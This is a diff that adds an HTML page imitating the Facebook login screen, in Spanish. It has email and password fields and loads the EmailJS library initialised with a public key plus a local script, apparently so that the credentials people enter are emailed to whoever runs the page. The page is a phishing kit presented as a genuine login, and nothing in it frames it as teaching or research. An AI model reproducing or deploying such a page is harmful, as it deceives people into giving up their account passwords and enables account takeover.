@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="../Facebook/facebook/pngwing.com.png" type="image/x-icon">
+    <link rel="stylesheet" href=".//facebook/estilo.css">
+    <title>Facebook</title>
+</head>
+<body>
+    <div class="container">
+        <div class="left-column">
+            <h1>facebook</h1>
+            <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+        </div>
+
+    <form id="form">
+        <div class="field">
+          <label for="email_id">Email</label>
+          <input type="text" name="email_id" id="email_id" required>
+        </div>
+        <div class="field">
+          <label for="password">Password</label>
+          <input type="password" name="password" id="password" required>
+        </div>
+
+        </div>
+          <a href="#" class="create-account-button">Crear cuenta nueva</a>
+        </div>
+
+        <div class="forgotten-password">
+         <a href="#">¿Olvidaste tu contraseña?</a>
+        </div>
+      
+        <input type="submit" id="button" value="Log In">
+    </form>
+      
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+      emailjs.init('L0ZrkoTM8zoQyzDY7');
+    </script>
+
+    <script src="java/java.js"></script>
+
+</body>
+</html>
+
